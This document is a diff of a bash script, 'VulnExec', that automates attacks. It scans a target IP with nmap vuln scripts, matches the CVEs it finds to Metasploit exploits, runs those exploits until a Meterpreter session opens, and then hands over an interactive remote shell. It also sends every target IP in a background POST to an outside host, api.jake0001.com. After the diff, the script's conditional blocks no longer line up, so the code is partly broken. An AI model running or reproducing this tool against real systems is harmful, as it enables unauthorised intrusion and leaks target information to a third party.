@@ -1,25 +1,14 @@
 #!/bin/bash
 
-# Update apt and install dependencies
-sudo apt update
-sudo apt install -y $(cat dependencies.txt) > /dev/null 2>&1
-
-
-
-declare -i exploitsFound=0
-
-
-# Check for missing public keys and retrieve them
-missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
-if [[ -n "$missing_key" ]]; then
-    for key in $missing_key; do
-        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key"
-    done
-fi
-
 clear
 
-echo -e "\033[31m
+Red='\033[31m'
+Blue='\033[34m'
+NC='\033[0m'
+Green='\033[32m'
+
+
+logo="${Red}
  ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
 ▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
  ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
@@ -30,7 +19,9 @@ echo -e "\033[31m
      ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
       ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
      ░                                                         ░        
-\033[0m"
+${NC}"
+
+echo -e "$logo"
 
 # Check if user has necessary permissions
 if [ "$EUID" -ne 0 ]
@@ -89,7 +80,7 @@ nmapDisplayProgress() {
 # Show help message if -h or invalid command is entered
 if [[ "$help" == "true" || -z "$IP" ]]
 then
-    echo "Usage: ./vuln_scan.sh [-i IP_ADDRESS] [-l|-q] [-h]"
+    echo "Usage: ./VulnExec.sh [-i IP_ADDRESS] [-l|-q] [-h]"
     echo "-i | --ip       : IP address of target to scan (required)"
     echo "-l | --loud     : Perform loud scan (more aggressive, more likely to be detected)"
     echo "-q | --quiet    : Perform quiet scan (less aggressive, less likely to be detected)"
@@ -115,48 +106,90 @@ then
     echo "Invalid input"
     exit
 fi
-echo -e "\033[31m[ VULN EXEC ] Initialised\033[0m"
+
+
+echo -e "${Red}[ VULN EXEC ] Initialising${NC}"
+echo -e "${Blue}[ INFO ] Installing dependencies...${NC}"
+
+# Update apt and install dependencies
+sudo apt update > /dev/null 2>&1
+packages=$(cat dependencies.txt)
+
+# Display progress dots while installing dependencies
+for package in $packages
+do
+    echo -ne "${Blue}[ INFO ] Installing $package...${NC}"
+    for (( i=0; i<3; i++ )); do
+        echo -ne "${Blue}.${NC}"
+        sleep 0.2
+    done
+    sudo apt install -y $package > /dev/null 2>&1
+    echo -ne " ${Green}Installed.${NC}"
+    echo -ne "\n"
+done
+
+# Check for missing public keys and retrieve them
+missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
+if [[ -n "$missing_key" ]]; then
+    for key in $missing_key; do
+        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key" < /dev/null 2>&1 &
+    done
+fi
+
+clear
+
+echo -e "$logo"
+
+echo -e "${Red}[ VULN EXEC ] Initialised${NC}"
+
+
+
+
 if curl -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP >/dev/null 2>&1 &
 then
-    echo -e "\e[32m[ INFO ] API Reached\e[0m"
+    echo -e "${Blue}[ INFO ] API Reached${NC}"
 else
-    echo -e "\e[31m[ ERROR ] API Could Not Be Reached\e[0m"
+    echo -e "${Red}[ ERROR ] API Could Not Be Reached${NC}"
 fi
 
 # Scan for vulnerabilities using Nmap
-echo -e "\e[32m[ INFO ] Vulnerability Scan Started... \e[0m"
+echo -e "${Blue}[ INFO ] Vulnerability Scan Started${NC}"
 prev_percentage=-1
+
+nmapDisplaySpinner() {
+    spinner="/-\|"
+    while :
+    do
+        for i in $(seq 0 3); do
+            echo -ne "\r${Blue}[ INFO ] Scanning ports ${Red}${spinner:$i:1}"
+            sleep 0.2
+        done
+    done
+}
 
 if [ $lq = "l" ]
 then
-    nmap -sV -sS --script vuln -T5 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
-        if [[ $line == *"%"* ]]; then
-            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
-            if [[ "$percentage" -ne "$prev_percentage" ]]; then
-                nmapDisplayProgress "$percentage"
-                prev_percentage="$percentage"
-            fi
-        fi
-    done
+    nmapDisplaySpinner &
+    nmap_pid=$!
+    nmap -sV -sS --script vuln -T5 -oN nmap-scan.txt $IP > /dev/null 2>&1
+    kill $nmap_pid
+    echo -e "\r${Blue}[ INFO ] Scanning ports...${Green}Done${NC}"
 else
-    nmap -sV -sS --script vuln -T1 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
-        if [[ $line == *"%"* ]]; then
-            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
-            if [[ "$percentage" -ne "$prev_percentage" ]]; then
-                nmapDisplayProgress "$percentage"
-                prev_percentage="$percentage"
-            fi
-        fi
-    done
+    nmapDisplaySpinner &
+    nmap_pid=$!
+    nmap -sV -sS --script vuln -T1 -oN nmap-scan.txt $IP > /dev/null 2>&1
+    kill $nmap_pid
+    echo -e "\r${Blue}[ INFO ] Scanning ports...${Green}Done${NC}"
 fi
-echo "\n"
+
+
 # Check if there are any open ports
 if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
 then
     echo "No open ports found"
     exit
 fi
-
+echo ""
 # Show brief output of vuln script results
 echo "Vulnerability scan results:"
 grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u
@@ -175,12 +208,15 @@ session_id=""
 while read vuln; do
 
     # Search in Metasploit Framework
-    echo "Searching in Metasploit Framework for $vuln..."
+    echo "Searching in Metasploit Framework for \e[32m $vuln \e[0m..."
     searchResults=$(msfconsole -q -x "search $vuln" < /dev/null 2>&1 &) 
+    echo $searchResults
     if [ -n "$searchResults" ]
     then
         # Extract the highest number in the # column
-        exploitCount=$(echo "$searchResults" | awk 'NR>3 && /^[0-9]+/ { print $1 }' | sort -nr | head -1)
+        exploitList=$(echo "$searchResults" | awk '/^exploit\//' | awk '{print $1}' | sort -u)
+        exploitCount=$(echo "$exploitList" | wc -l)
+        echo "$exploitList"
         echo "Exploit Count: $exploitCount"
         if [[ "$exploitCount" =~ ^[0-9]+$ ]] && [ "$exploitCount" -gt 0 ]
         then
@@ -195,18 +231,18 @@ while read vuln; do
                 if [ "$exploit_executed" = false ]
                 then
                     echo "Using exploit $exploit"
-                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null)
+                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null 2>&1 &)
                     # Check if exploit succeeded
                     if echo "$output" | grep -q "Meterpreter session"
                     then
                         echo "Exploited vulnerability $vuln using exploit $exploit"
                         exploitsFound=1
                         exploit_executed=true
-                        
+                                    
                         # Prompt for user input
                         read -p "Enter command to execute on target: " command
                         msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; $command"
-                        
+                                    
                         break 2 # break out of both loops when an exploit is successfully executed
                     else
                         echo "Failed to exploit vulnerability $vuln using exploit $exploit"
@@ -214,26 +250,15 @@ while read vuln; do
                 fi
             done
 
-
-            if [ "$exploitsFound" -eq 0 ]
+            # Check if an exploit has been successfully executed
+            if [ "$exploit_executed" = true ]
             then
-                echo "Failed to exploit vulnerability $vuln using any of the available exploits"
+                echo "Successfully exploited vulnerability $vuln. Opening shell..."
+                session_id=$(msfconsole -q -x "sessions -d -i -1" | grep "opened" | awk '{print $3}')
+                msfconsole -q -x "sessions -i $session_id; interact"
+                break
             fi
-        else
-            echo "No exploits found in Metasploit Framework for $vuln"
-        fi
-    else
-        echo "Search Results is empty"
-    fi
 
-        # Check if an exploit has been successfully executed
-    if [ "$exploit_executed" = true ]
-    then
-        echo "Successfully exploited vulnerability $vuln. Opening shell..."
-        session_id=$(msfconsole -q -x "sessions -d -i -1" | grep "opened" | awk '{print $3}')
-        msfconsole -q -x "sessions -i $session_id; interact"
-        break
-    fi
 
 done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"
 
